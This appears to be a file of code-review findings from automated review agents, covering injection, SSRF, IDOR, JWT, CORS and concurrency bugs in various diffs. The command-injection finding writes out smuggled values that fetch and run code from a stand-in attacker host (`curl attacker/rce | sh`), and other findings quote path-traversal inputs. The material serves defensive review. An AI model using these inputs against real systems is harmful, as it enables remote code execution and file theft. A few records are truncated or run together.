findings.title: csv_rows does not use csv_escape, allowing separator injection
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) for c in columns)` and never calls the `csv_escape` helper added ten lines below it. Any row value that itself contains a comma, a double quote or a newline will be emitted unquoted, so a single logical field becomes two or more fields in the rendered output — a consumer parsing the result sees a different record shape than the producer intended, and the value's author chooses where the boundary falls.

Fix by routing values through the escape helper, e.g. `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note that `csv_escape` as written also does not handle embedded newlines (`\r`/`\n`), which RFC 4180 requires quoting; Python's stdlib `csv` module handles all of these cases and is worth preferring over hand-rolled quoting.

I cannot see where `rows` originates — neither the diff nor the retrieved context shows a caller or request handler — so I cannot claim the data is attacker-controlled today. If these exporters ever render user-submitted report data, the entry point is that data and the sink is the CSV line on line 7. Note also the classic downstream concern for CSV exports of untrusted data: values beginning with `=`, `+`, `-` or `@` are executed as formulas by spreadsheet applications, and neither helper neutralises them.

findings.title: Date comparison races the midnight boundary and will flake
findings.body:
`issue_token()` captures `issued_at` at one instant and the assertion recomputes `datetime.now(timezone.utc).date()` at a later instant. If the token is issued at 23:59:59.999 UTC and the assertion runs a millisecond later, the two dates differ and the test fails — non-deterministically, and only in a window that CI will eventually hit. Inject a fixed clock instead: have `issue_token` accept a `now=` (as `is_expired` evidently does on line 6) and assert against that exact value, or freeze time for the duration of the test. Comparing to a re-read wall clock is never a sound assertion.

_Also raised by the tests agent:_ Flaky test: date-boundary race in token issuance test

findings.title: `is_expired` called without `now=`, unlike the existing test
findings.body: The pre-existing test on line 6 always passes `now=` explicitly. This call omits it, so the test depends on `is_expired` having a default that reads the wall clock. If `now` is a required parameter this test raises `TypeError`; if it defaults to the current time, the assertion is again clock-dependent rather than deterministic. Pass an explicit `now=` derived from `token.issued_at` so the assertion states the intended property (a freshly issued token is not yet expired) without consulting the real clock.

findings.title: No test exercises CouponExpired branch
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated in this PR (test_apply_coupon_reduces_total) uses expires_at=tomorrow(), which never hits this branch. If the expiry comparison were inverted, removed, or the exception type changed, no test would fail. Add a test that passes an expired coupon and asserts CouponExpired is raised.

findings.title: Unguarded comparison breaks on None or naive expires_at
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` assumes `expires_at` is always present and always timezone-aware. If a coupon has no expiry (`expires_at is None`) the comparison raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'`; if it is a naive datetime (common when loaded from a DB column without tz), it raises `TypeError: can't compare offset-naive and offset-aware datetimes`. Either way a perfectly valid coupon fails with an opaque TypeError instead of applying or raising `CouponExpired`. Guard with `if coupon.expires_at is not None and ...` and normalise naive values to UTC before comparing.

findings.title: Blocking requests.get inside async handler stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async` but its only I/O is `requests.get(...)`, a synchronous call. Because there is no `await`, the coroutine never yields: the whole event loop is frozen for the duration of the call — up to the 5 second timeout, and longer if connection setup hangs before the timeout applies. Every other concurrent request served by this loop stalls with it, which is exactly the failure mode the awaited `httpx` call on line 6 avoids.

Use the async client that is already a dependency here, mirroring `fetch_plan`, e.g. accept an `httpx.AsyncClient` (or create one in an `async with`) and `response = await client.get("https://billing.internal/limits/{tenant_id}", timeout=5)`. If `requests` must be kept, the call has to be pushed off the loop via `asyncio.to_thread(...)`, and the `import requests` on line 2 can then be dropped once migrated.

findings.title: Unencoded tenant_id interpolated into internal billing URL
findings.body: `tenant_id` is placed into the request path with an f-string and no percent-encoding or format validation. A value such as `../../admin`, `1/../internal-op`, `1?role=admin` or `1#` lets a caller reach paths and query strings on `https://billing.internal` other than `/limits/<id>` — the classic server-side path-traversal/SSRF-by-path pattern against an unauthenticated-by-network internal service. Fix by validating the identifier against its expected shape (e.g. UUID/int) before use, or by passing it through `urllib.parse.quote(str(tenant_id), safe='')` / `requests.get(base, params=...)` so separators cannot escape the segment.

findings.title: Bare except swallows KeyboardInterrupt and SystemExit
findings.body: `except:` with no exception class catches `BaseException`, which includes `KeyboardInterrupt`, `SystemExit` and `GeneratorExit`. If a Ctrl-C or an interpreter shutdown lands while `_client.send` is in flight (a network call, so it is often the longest-blocking point in the process), the signal is discarded and the function returns `None` as if nothing happened — the process keeps running and the shutdown or interrupt is lost. Narrow this to `except Exception:` at minimum, and preferably to the specific transport/HTTP errors the client raises so that programming errors (TypeError on a malformed payload, AttributeError on an uninitialised `_client`) are not hidden too.

findings.title: No test covers push_metrics' new error-swallowing behaviour
findings.body: push_metrics now catches all exceptions and returns None instead of propagating. There is no test verifying that a failing _client.send still results in push_metrics returning None, nor one confirming normal payloads still succeed. Without such a test, a future change that removes or narrows the except clause (or reintroduces a crash) would not be caught.

findings.title: Public function behavior change undocumented
findings.body: The `push_metrics` function is now a public API that silently returns None on any exception, including fatal ones like KeyboardInterrupt and SystemExit. A caller cannot predict this behavior from the function signature alone and may incorrectly assume exceptions propagate. Add a docstring explaining the exception-handling behavior and why all exceptions are caught.

findings.title: try_consume races on _counters: limit bypass and lost updates
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` at line 15, yields control at line 18 (`await asyncio.sleep(0)`), then writes back an absolute value computed from the stale read at line 19. Two consequences on a single event loop:

1. Limit bypass: two concurrent calls for the same tenant both read `current` before either writes, both pass the `current + cost > LIMIT` check, and the counter ends up over `LIMIT`. With N concurrent callers the overshoot is unbounded.
2. Lost update: the write is an assignment of `current + cost`, not an increment, so it discards any increment applied in between — including one from `consume()` (line 10), which mutates the same dict under `_lock`. `try_consume` never acquires `_lock`, so it provides no mutual exclusion against `consume` either.

Fix by holding the existing lock across the whole read-check-write, and by incrementing rather than assigning:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

If the `await` at line 18 stands in for real I/O, that I/O must be moved outside the critical section and the counter re-read (or reserved-then-committed) after it.

_Also raised by the security agent:_ Rate limit bypassable: check-then-act across await, no lock held

findings.title: Public function `try_consume` lacks contract documentation
findings.body: The `try_consume` function is exported and callable by other modules. Its name suggests it will atomically check the limit and consume quota if safe, but the code actually exhibits a check-then-act race: it reads `_counters[tenant]` outside the lock on line 15, then sleeps, then writes without the lock on line 19. A caller could reasonably expect atomicity and would be surprised to find concurrent calls both succeeding when their combined cost exceeds LIMIT. This function needs a docstring that explicitly documents the race condition and when it is safe to use, or an explanation of why the caller should not rely on the returned boolean as a true rate-limit guarantee.

findings.title: New racy try_consume has no test guarding its concurrency behavior
findings.body: try_consume reads _counters (line 15), awaits (line 18), then writes (line 19) without holding _lock, unlike consume which does hold _lock across the whole read-modify-write. If two concurrent calls interleave between the read and write, both can pass the limit check and the tenant's counter can exceed LIMIT. No test file was added in this diff, so a concurrent-invocation test that would expose this race (e.g. firing multiple try_consume calls concurrently near the limit and asserting the counter never exceeds LIMIT) does not exist, and this defect would ship silently.

Line 10 appends to it and line 11 returns it, so the second call reports failures from the first call as well, and the caller receives a reference to module-level state it can mutate. Use `def send_with_retries(recipients, attempted=None):` followed by `attempted = list(attempted or [])` (or `attempted = [] if attempted is None else attempted`), matching the `extra_headers or {}` idiom already used on line 2 of this file.

findings.title: New send_with_retries function has no test coverage
findings.body: send_with_retries introduces a mutable default argument (attempted=[]) that persists across calls, which would cause accumulating results across separate invocations. No test exists to catch this; a test calling the function twice without passing `attempted` would reveal state leaking between calls.

findings.title: Shared default list leaks recipients across calls and grows unbounded
findings.body:
`attempted=[]` is evaluated once at function definition, so every call that does not pass `attempted` mutates and returns the *same* list object. Two consequences with a security flavour:

1. Information disclosure: the returned list contains failed recipients accumulated from all previous calls in the process. If callers belong to different tenants/requests, one caller receives recipient identifiers (addresses, phone numbers, user IDs) that were supplied by another.
2. Unbounded growth: the module-level list is never reset, so repeated failing dispatches grow process memory for the lifetime of the worker — a slow resource-exhaustion path that an attacker who can trigger failing sends can drive.

Fix by matching the `None` default already used on the sibling helper (`extra_headers or {}` on line 2): `def send_with_retries(recipients, attempted=None): attempted = list(attempted or [])`.

findings.title: Public function send_with_retries lacks documentation of contract
findings.body: The function send_with_retries is exported and its behavior is not self-evident from the signature alone. A caller would reasonably wonder: (1) what does the attempted parameter do and why would it be passed in? (2) is the returned list the same object as the input parameter or a new one? (3) what does _dispatch returning falsy mean? Documentation or a more explicit design would prevent misuse.

findings.title: Rounding boundary flipped: `>= 0.5` became `> 0.5`
findings.body: In the middle of an otherwise purely mechanical rename, `compute_rounding` changed its comparison from `line.remainder_cents >= 0.5` to `line.remainder_cents > 0.5`. For the exact boundary value `remainder_cents == 0.5` the function now returns 0 instead of 1, i.e. it truncates instead of rounding half-up. findings.title: Retry wraps non-idempotent charge() — duplicate charges on transient failure
findings.body:
`@retry(attempts=3)` is applied to `charge_card`, which calls `billing.gateway.charge`. That function's docstring states it is "NOT idempotent: each call creates a new charge" and that the gateway supports an `Idempotency-Key` header to make retries safe. Any failure that occurs after the gateway has accepted the POST (timeout, dropped connection, 5xx from a proxy after the charge was written) will cause the decorator to re-POST and create a second — and possibly third — charge for the same intent. The customer is billed multiple times and there is no compensating logic here.

Fix by generating a stable idempotency key per logical charge attempt and passing it through to the gateway call, so all three attempts collapse to one charge server-side. For example, accept or derive a key in `charge_card` and forward it to `charge(...)`; only then is the retry safe. If the gateway call cannot yet accept a key, remove the decorator from this function — the retry on `fetch_charge` (line 5), which wraps the documented-safe `get_charge`, is fine as written.

findings.title: Auth token in Referer header is logged verbatim after scrubbing removed
findings.body:
The removed branch passed the `Referer` value through `_scrub_uri(value, extra_param_keys)` before logging; the replacement copies `request.headers[header]` unchanged for every header, including `Referer`, and line 6 serialises the whole dict into the log.

So any 5xx triggered while a token-bearing page is loading writes a live authentication token into the server log in cleartext. Anyone who can read logs \u2014 operators, log-shipping pipelines, support bundles, CI artifacts \u2014 obtains a credential that grants full access to the server.

Restore the per-header scrub: keep the `if header == "Referer": value = _scrub_uri(value, extra_param_keys)` branch (or apply `_scrub_uri` to any header that can contain a URL) before assigning into `headers`.

findings.title: Buffer pre-reserved from client-declared Content-Length (memory exhaustion)
findings.body:
`rw := multipart.NewRW().Reserve(contentLength)` sizes the pool-backed buffer from `contentLength`, which for an S3 UploadPart request originates in the client-controlled `Content-Length` header and is passed straight into this helper. Because the reservation happens before `io.Copy` on line 8, an attacker never has to send the bytes they claim: a handful of concurrent `PUT ?partNumber=N&uploadId=...` requests advertising multi-gigabyte lengths and then stalling or closing is enough to drive the server into OOM. The previous code (removed comment: "The RW grows a page at a time as the body is read") bounded allocation by bytes actually received, which is the safe behaviour.

Either drop the `Reserve` call and let the RW grow as the body streams, or clamp it, e.g. reserve `min(contentLength, maxPartReserve)` with a modest cap, and additionally reject `contentLength` above the S3 5 GiB per-part limit before allocating anything.

findings.body:

If this line regresses again in either direction, nothing would fail.

findings.title: readany can return empty bytes before EOF after single wait
findings.body:
`_wait()` is documented to resolve at the end of a chunk even when no new data was added to the buffer, so a caller must loop and re-check its condition. Replacing the `while` with an `if` means that after a single spurious wake-up, control falls through to `self._read_nowait(-1)` with an empty buffer and no EOF, returning `b''`. The established contract of `readany()` is that an empty result signals end of stream, so consumers iterating `while True: chunk = await readany(); if not chunk: break` will silently truncate the body mid-stream rather than blocking for the next chunk. Restore the loop: `while not self._buffer and not self._eof: await self._wait('readany')`.

_Also raised by the security agent:_ readany() can return b"" before EOF, letting a peer truncate a stream

findings.title: No test covers spurious/no-data wakeup from _wait
findings.body: The docstring for _wait explicitly warns that the waiter can be resolved with no new data in the buffer, requiring callers to re-check their condition in a loop. This change replaces the while loop with a single if, so after one wakeup with no data, read() would return prematurely (empty read) instead of re-waiting. No test in this diff exercises the case of _wait resolving without data being added to the buffer, so this regression would not be caught by any existing or added test.

findings.title: Implicit relative import breaks `requests.sessions` on Python 3
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Implicit relative imports were removed in Python 3 (PEP 328), so this line raises `ModuleNotFoundError: No module named 'adapters'` as soon as `requests.sessions` is imported — which is on the main import path of the package. Even on Python 2 it is unsafe: it will bind to a top-level `adapters` module if one happens to be on `sys.path`, silently importing the wrong `HTTPAdapter`. Restore the explicit form `from .adapters import HTTPAdapter`, matching the sibling import on line 6.

findings.title: Implicit import allows sys.path shadowing of `adapters`
findings.body:
`from adapters import HTTPAdapter` no longer pins the import to the package (`requests.adapters`); on Python 3 (and on Python 2 once `absolute_import` is in effect) it is resolved against `sys.path`, which includes the script directory / CWD in many invocation modes. Any `adapters.py` or `adapters/` earlier on the path — dropped into an application's working directory, an installed site-packages distribution, or a zip/egg entry — is imported and executed instead of the library's own module, giving arbitrary code execution inside any process that imports `requests.sessions`, plus silent substitution of the HTTP transport adapter (TLS verification, proxying, redirect handling).

Restore the explicit relative form: `from .adapters import HTTPAdapter`, matching the neighbouring `from .packages.urllib3.poolmanager import PoolManager` on line 6.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body: `self.request.cookies` is documented to return `None` when the Cookie header is present but cannot be parsed (see `tornado/httpserver.py`: "Set to None when the Cookie header is present but cannot be parsed, so every consumer has to allow for that"). With the guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable`, turning a client-supplied malformed header into a 500. Any handler calling `get_cookie` (including secure-cookie/XSRF paths that build on it) is affected. Restore the check, e.g. `if self.request.cookies is not None and name in self.request.cookies:`, or have the property return an empty dict instead of `None` and update the documented contract.

findings.title: Malformed Cookie header makes get_cookie raise TypeError
findings.body:
`HTTPRequest.cookies` is documented to return `None` when the Cookie header is present but cannot be parsed (`tornado/httpserver.py`: "Set to None when the Cookie header is present but cannot be parsed, so every consumer has to allow for that"). Removing the `self.request.cookies is not None` guard means `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the `Cookie:` request header, fully attacker-controlled and unauthenticated. Sink: the membership test on line 3, reached by any handler that calls `get_cookie` / `get_secure_cookie` (XSRF handling, session lookup, etc.). A single crafted header turns normal requests into unhandled 500s, and with `debug=True` the traceback is rendered back to the client. Restore the None check, or make `cookies` return an empty dict rather than `None`.

findings.title: get_cookie docstring silent on TypeError when cookies malformed
findings.body: The docstring states the method "Gets the value of the cookie with the given name, else default." After this change, if the Cookie header is malformed and `request.cookies` is None (documented in httpserver.py), the code will raise `TypeError: argument of type 'NoneType' is not iterable` rather than returning the default. A caller following the documented contract would expect `default` to be returned, not an exception. The docstring should document that a malformed Cookie header raises TypeError, or the code should handle the None case as the original did.

findings.title: No test covers malformed-Cookie-header regression
findings.body: The removed None-check protected against request.cookies being None (per httpserver.py docstring: cookies is set to None when the Cookie header is present but cannot be parsed). This diff reintroduces a TypeError crash ('argument of type NoneType is not iterable') for that case. Since no test exercises get_cookie with a malformed Cookie header, this regression would pass CI silently.

findings.title: Dropping .strip() makes boundary never match after '; '
findings.body: A real Content-Type header is `multipart/form-data; boundary=----WebKitFormBoundaryX`. Splitting on `";"` yields `["multipart/form-data", " boundary=----..."]` — the second element retains the leading space from the conventional `"; "` separator. Without `field.strip()`, `partition("=")` gives `k == " boundary"`, so the `k == "boundary"` test on line 5 fails, the loop falls through, `_parse_mime_body` is never called, and the request's form arguments and files are silently empty — no exception, no log. The same strip also protected the value side against trailing whitespace/CR before the next parameter. Restore `field.strip().partition("=")` (or strip `k` and `v` individually).

findings.title: Dropping .strip() lets clients suppress multipart body parsing via Content-Type
findings.body:
`field.partition("=")` is now applied to the raw segment produced by `content_type.split(";")`. For the standard wire form `multipart/form-data; boundary=----abc` the second segment is `" boundary"`, so `k` is `" boundary"`, the `k == "boundary"` test on line 5 fails, and `_parse_mime_body` on line 6 is never reached — the request body is silently discarded instead of populating arguments/files.

The entry point is the client-supplied `Content-Type` request header; the sink is the `_parse_mime_body` call that is now conditionally skipped. Because whitespace placement around the `;` is entirely under the requester's control and is not normalised anywhere visible here, a client can choose whether Tornado parses the body at all while an upstream proxy, WAF, logging tier or upload scanner — which does tolerate the space, per RFC 9110 parameter syntax — parses it normally. That is a parser differential: content inspected and approved by the front tier may reach the application as an empty argument set, or validation/authorisation logic keyed on `self.request.files` / `arguments` may see nothing and take a different branch. There is also a silent-data-loss failure mode for legitimate uploads.

Restore the `.strip()` (`k, sep, v = field.strip().partition("=")`) or, better, strip `k` and `v` independently and strip optional quotes from `v` per RFC 2046 so quoted boundaries are handled too.

findings.title: No test covers boundary parsing with leading whitespace
findings.body: The change removes field.strip() before partitioning on '='. This will break parsing when a content-type header has a space after the semicolon (e.g. 'multipart/form-data; boundary=xyz'), since k would be ' boundary' instead of 'boundary', causing the boundary check to fail silently and multipart bodies to not be parsed. There is no test in this diff exercising a content-type string with such whitespace, so this regression would not be caught.

findings.title: Format placeholder without argument in error message
findings.body:
The error message contains a format placeholder `%s` but no argument is provided to fill it. When this exception is raised, Python will raise a TypeError: 'not all arguments converted during string formatting'. This will break the code at runtime. The `url` variable should be kept in the format string as it was on the previous line.

_Also raised by the correctness agent:_ Format placeholder left without its argument in error message

findings.title: No test exercises the invalid-port error path
findings.body: The change breaks `LocationParseError("Failed to parse: %s" % url)` by dropping the `% url` argument, so this line will raise `TypeError: not enough arguments for format string` whenever an invalid port is encountered, rather than the intended `LocationParseError`. No test in this diff (or apparently in the surrounding suite, since none is included) exercises the invalid-port branch, so this regression would go unnoticed.

findings.title: Command injection via shell=True with interpolated name/directory
findings.body:
`create_archive` formats `name` and `directory` directly into a shell string (line 9) and executes it through `/bin/sh` via `shell=True` (line 10). Any shell metacharacter in either argument escapes the intended `tar` invocation — e.g. `name = "x; curl attacker/rce | sh; #"` or `directory = "/tmp $(id)"` — yielding arbitrary command execution with the privileges of the service process.

Fix by passing an argument list and dropping the shell, as the existing `list_exports` on line 5 already does:

```python
output = os.path.join("/exports", f"{name}.tar.gz")
subprocess.run(["tar", "-czf", output, directory], check=True)
```

Even with the list form, `name` should be validated against an allowlist (e.g. `^[A-Za-z0-9_-]+$`) before being joined onto `/exports`, otherwise a `name` containing `../` writes the archive outside the export directory. `directory` should likewise be constrained, and `--` used before positional paths so a leading `-` is not parsed as a tar option.

findings.title: Unquoted interpolation into shell=True breaks on spaces/metacharacters
findings.body: `cmd` is assembled by f-string interpolation and executed with `shell=True`, so the shell re-splits the result on whitespace and expands metacharacters. A perfectly ordinary `name="Q3 report"` produces `tar -czf /exports/Q3 report.tar.gz <dir>`, which tars into `/exports/Q3` and then treats `report.tar.gz` as an input path — `tar` either fails (raising `CalledProcessError` via `check=True`) or silently writes the archive to the wrong filename. The same applies to a `directory` containing spaces, `*`, `$`, or `~`. Use the argument-list form, matching `list_exports` above: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`, which passes each argument through untouched and removes the shell entirely.

findings.title: create_archive has no test coverage
findings.body: The new create_archive function builds a shell command via string interpolation and executes it with shell=True. There is no test in this diff exercising this function, so neither its intended behaviour (archiving a directory) nor a future fix (e.g. switching to a safe subprocess call without shell=True) would be verified by any test. Add a test that calls create_archive with a controlled name/directory and asserts on the resulting file or on the constructed command, so a regression or an insecure change is caught.

findings.title: Wildcard CORS origin combined with credentials on dashboard routes
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, in contrast to the existing export just above it which restricts to `ALLOWED`. The entry point is the `Origin` header of any cross-site request; the sink is the `Access-Control-Allow-Origin` / `Access-Control-Allow-Credentials` response headers emitted by this middleware.

Two outcomes, both bad:
- If the underlying middleware reflects the request origin (many wrappers and hand-rolled shims do, and some treat `"*"` as "reflect" when credentials are enabled), any attacker-controlled page can issue credentialed XHR/fetch to the dashboard endpoints and read the authenticated response, giving full cross-origin read of whatever the dashboard exposes for the victim's session.
- If the literal `*` is emitted, browsers reject the credentialed response and the dashboard silently breaks for cookie-authenticated users — a functional failure that will tempt someone to "fix" it by switching to origin reflection.

Fix: reuse the `ALLOWED` allowlist (extended with the dashboard's own origin) rather than `"*"`, or drop `credentials: true` if the dashboard genuinely needs to serve unauthenticated cross-origin requests.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
`dashboardCors` sets `origin: "*"` while also setting `credentials: true`. The `cors` package will emit the literal header `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. The Fetch/CORS specification forbids that combination: when a request is made with `credentials: "include"` (or `withCredentials: true`), a wildcard `Access-Control-Allow-Origin` fails the check and the browser discards the response. So every cookie- or auth-header-bearing request from the dashboard will fail, which is the opposite of the intent of enabling `credentials`.

Fix by reflecting the request origin from an allowlist rather than using a wildcard, e.g. `origin: DASHBOARD_ORIGINS` (an array or a callback), keeping `credentials: true`. If credentials genuinely are not needed for this route, drop `credentials: true` instead so the wildcard becomes valid. Note that the existing config above (line 6) already uses an `ALLOWED` value, which suggests the allowlist mechanism is already available here.

findings.title: New CORS config has no test verifying behavior
findings.body: dashboardCors is a new exported configuration combining a wildcard origin with credentials:true — a combination that most CORS middleware either rejects or silently mishandles at runtime. There is no test in this diff that exercises this config (e.g., asserting what headers are actually produced for a request, or that the app fails to start / errors as expected). If the intended behavior changes later (e.g., someone 'fixes' it by locking the origin, or the underlying library changes how it handles wildcard+credentials), nothing would fail to signal the change.

findings.title: Live AcmePay secret key hardcoded in source, replacing env lookup
findings.body:
`ACMEPAY_SECRET_KEY` is a literal `acme_live_...` credential committed to the repository, and `client()` now assigns it to `acmepay.api_key` instead of reading `os.environ["ACMEPAY_SECRET_KEY"]`. The `acme_live_` prefix indicates a production (not test) key for a payments provider, so anyone with read access to the repo, to CI logs, to a fork, or to any historical clone can charge, refund, or read payment data through the provider API.

Remedy: (1) treat this key as compromised and rotate it at the provider immediately; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (re-adding the removed `import os`); (3) purge the literal from git history, since reverting the commit leaves it readable in the object store; (4) add a secret scanner to pre-commit/CI so a `acme_live_` literal fails the build.

findings.title: Removing env lookup makes every environment use the live key
findings.body: `client()` previously resolved the API key at call time from `os.environ["ACMEPAY_SECRET_KEY"]`, which is what allowed dev, CI, staging and production to each supply their own credential (and which failed loudly with a `KeyError` when misconfigured). After this change the key is a module-level constant named `acme_live_...`, so there is no longer any override path: a test run or a staging deploy will now transact against the live payments account, and a missing/incorrect deployment secret no longer surfaces as an error — it silently succeeds against prod. Restore the environment lookup (optionally with an explicit, loudly-failing default) rather than inlining the value.

findings.title: No test covers client()'s switch from env var to hardcoded key
findings.body: The behavior of client() changed from reading ACMEPAY_SECRET_KEY out of os.environ to using a hardcoded module-level constant. No test in this diff (or referenced) calls client() and asserts acmepay.api_key is set correctly. If this assignment were reverted, broken, or pointed at the wrong constant, nothing would fail.

findings.title: fake_client() return shape does not match client()
findings.body: `client()` in `billing/acmepay_client.py` sets `acmepay.api_key` and returns the `acmepay` module, i.e. callers reach the key as an attribute (`client().api_key`). `fake_client()` returns a plain dict, so the key is only reachable via `["api_key"]`. Any test that substitutes this fixture for the real client will either fail on attribute access or, worse, pass while exercising an interface the production code never uses. Consider returning an object that mirrors the real client's attribute access.

findings.title: tenant_id read from JWT with signature verification disabled
findings.body:
`tenant_of()` calls `jwt.decode(..., options={"verify_signature": False})` and returns `unverified["tenant_id"]`. An unverified decode is just base64 parsing: anyone who can present a token can hand-craft a payload with any `tenant_id` (no key, no valid signature, no expiry check either, since disabling signature verification in PyJWT also skips `exp`/`aud` validation by default). If any caller uses this value to scope queries or authorise access, that is cross-tenant data access by simply editing the middle segment of the token.

The existing `claims_for()` on line 7 already does the right thing: `jwt.decode(token, public_key(), algorithms=["RS256"])`. Avoiding a key lookup is not a sufficient reason to drop verification — implement `tenant_of()` as `claims_for(token)["tenant_id"]`, and if the key lookup cost matters, cache the public key rather than skipping the check. If there is a genuine need to read a claim before the key is known (e.g. to select the signing key per tenant), the unverified value must be treated as a hint only and re-validated against the verified claims, and the function should be named to make that obvious (`_unverified_tenant_hint`).

findings.title: verify_signature=False also disables exp/aud checks, unlike claims_for
findings.body: In PyJWT, setting `options={"verify_signature": False}` turns off the other registered-claim validations as well (`verify_exp`, `verify_aud`, `verify_iss`) unless each is explicitly re-enabled. So `tenant_of` will happily return a tenant id from an expired or wrong-audience token, while `claims_for` on line 7 rejects the very same token. Two functions in the same module now disagree about whether a token is usable, and callers that gate on `tenant_of` get a stale tenant scope. If an unverified read is genuinely needed, at minimum pass `options={"verify_signature": False, "verify_exp": True}` and document the divergence; preferably derive the tenant from `claims_for(token)` so there is a single decode path.

findings.title: Public function skips verification without documenting why
findings.body: `tenant_of` is a new public API (exported at module level, called by untested external code) that deliberately disables JWT signature verification on line 11. A caller reading only the function name and signature would assume the token is validated. The docstring must explicitly state that verification is skipped and why this is safe, so a maintainer or security auditor can understand the decision and spot misuse.

findings.title: No test covers tenant_of()'s unverified-signature behavior
findings.body: tenant_of() introduces a new code path that decodes a JWT without verifying its signature and trusts the tenant_id claim. No test exists in this diff exercising this function — e.g. verifying it extracts tenant_id from a valid token, or documenting/asserting the (dangerous) behavior with a tampered/forged token. Since nothing in the surrounding diff shows existing test coverage for auth/tokens.py, a regression or an accidental fix that changes this behavior would go undetected either way.

findings.title: Missing ownership check lets any user modify any payment method
findings.body:
`update_payment_method` takes `pm_id` straight from the request, loads the object with `PaymentMethod.get(pm_id)` (line 12) and writes to it (lines 13-14) with no authorisation check. Authentication is performed on line 11 via `current_user(request)`, but the resulting `user` is never used — the repository's own helper documents that `current_user` is "Authentication only — never authorisation" and that "Every object mutation must call" `require_owner`. The sibling read handler at line 6 does exactly that.

Any authenticated user can enumerate or guess `pm_id` values and overwrite the `billing_name` of another account's saved payment method (a horizontal IDOR; the same shape would extend to any other field added later). Fix by inserting `require_owner(user, pm)` immediately after the load:

```python
user = current_user(request)
pm = PaymentMethod.get(pm_id)
require_owner(user, pm)
```

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unchecked body["billing_name"] and possibly-None PaymentMethod.get

findings.title: No test would catch missing ownership check on update endpoint
findings.body: update_payment_method loads a PaymentMethod by id and mutates/saves it without calling require_owner, unlike the sibling read endpoint above which does call it. No test file is included in this diff, so nothing would fail if a user updates another user's payment method. Given the existing convention (require_owner used in the adjacent function), a test asserting Forbidden is raised for a non-owner should be added.

findings.title: Rate limit removed from password reset endpoint
findings.body: `request_reset` was previously throttled to 5 requests/hour via `@rate_limit("5/hour")`; the decorator and its import are deleted, leaving the handler unthrottled. An unauthenticated caller controls the `email` argument and it flows directly into `send_reset_email(email)` with no other guard visible in the diff. That enables (a) mail-bombing an arbitrary victim address, (b) burning outbound mail quota/reputation, and (c) account-enumeration probing at unlimited speed if the response or timing differs for known vs unknown addresses — here the response is a constant `{"sent": True}`, so enumeration depends on timing/side effects rather than the body. Restore the decorator, or move the throttle to a middleware/gateway layer and note where it now lives; if the removal is deliberate because limiting moved upstream, that upstream limit should be referenced in the change.

findings.title: No test guards against removal of rate limiting on password reset
findings.body: The `@rate_limit("5/hour")` decorator was removed from `request_reset`, but no test in this diff (or apparently in the repo) asserts that repeated calls to this endpoint are throttled. If this change is wrong (i.e., the rate limit should remain), nothing would fail — a test that repeatedly calls `request_reset` and expects a limit/error after N calls is needed to catch this class of regression in the future.

findings.title: read_export_preview skips _confined(), allowing arbitrary file read
findings.body:
The existing reader on line 14 resolves the caller-supplied `name` through `_confined(name)` before opening it; the new `read_export_preview` instead does a bare `os.path.join(EXPORT_ROOT, name)`. `os.path.join` performs no containment: a `name` of `../../etc/passwd` walks out of `EXPORT_ROOT`, and an absolute `name` such as `/etc/shadow` causes `join` to discard `EXPORT_ROOT` entirely and return the absolute path. The first 4096 bytes of any file readable by the process are then returned to the caller.

Route this function through the same helper: `path = _confined(name)` before `open(path, "rb")`, so both entry points share one containment check.

_Also raised by the security agent:_ read_export_preview skips _confined(), allowing path traversal

findings.title: Public function lacks documentation of unsafe path handling
findings.body: The new `read_export_preview()` function accepts a `name` parameter and passes it directly to `os.path.join()` without any path normalization or confinement, unlike the existing `read_export()` function on line 14 that calls `_confined(name)`. A caller who understands the module's existing pattern would reasonably expect this function to be safe from path traversal. Without a docstring explaining this difference in contract, a competent caller could use it unsafely.

findings.title: New unconfined path-join function has no test coverage
findings.body: read_export_preview joins EXPORT_ROOT with an unvalidated name via os.path.join instead of using the _confined() helper used by the neighboring function. Nothing in this diff or the surrounding code shown exercises this function with a traversal string like '../secret' to verify (or disprove) that it escapes EXPORT_ROOT. A test asserting the function raises or refuses such input would catch this behavior if it were wrong; absent that, the omission of path confinement can ship silently.

findings.title: Tenant ownership check removed from bulk_export (IDOR)
findings.body:
`bulk_export` previously called `require_owner(user, report)` for every fetched report before serialising it. Both the import and the loop were deleted, so `Report.get(rid)` results are now returned for any `rid` the caller supplies, with no comparison of `report.tenant_id` against `user.tenant_id`. Any authenticated user can enumerate or guess report IDs and read another tenant's data. The retrieved docstring for `require_owner` states explicitly that every cross-tenant object read must go through it, so this endpoint no longer meets the documented contract.

Note also that `user = current_user(request)` on line 5 is now dead — its result is unused — which is the tell that the authorization step is simply gone rather than relocated.

If the motivation was performance, keep the control and fix the cost instead: fetch the reports with a tenant-scoped query (e.g. `Report.where(id__in=report_ids, tenant_id=user.tenant_id)`) so the filter happens in one round trip, and treat any requested id not returned as forbidden/not-found rather than silently omitted.

_Also raised by the security agent:_ Ownership check removed from bulk_export enables cross-tenant IDOR

findings.title: Removed authz check has no test guarding against regression
findings.body: The diff removes the require_owner() call from bulk_export, eliminating the tenant-ownership check on each report before export. No test file is part of this PR, so there is nothing that would fail if a user requests report_ids belonging to another tenant. Given require_owner exists specifically to prevent cross-tenant access (per api/auth.py docstring), this behavior change should be covered by a test that asserts Forbidden is raised (or reports are excluded) when report_ids includes objects from a different tenant.

findings.title: Public bulk_export lacks authorization contract documentation
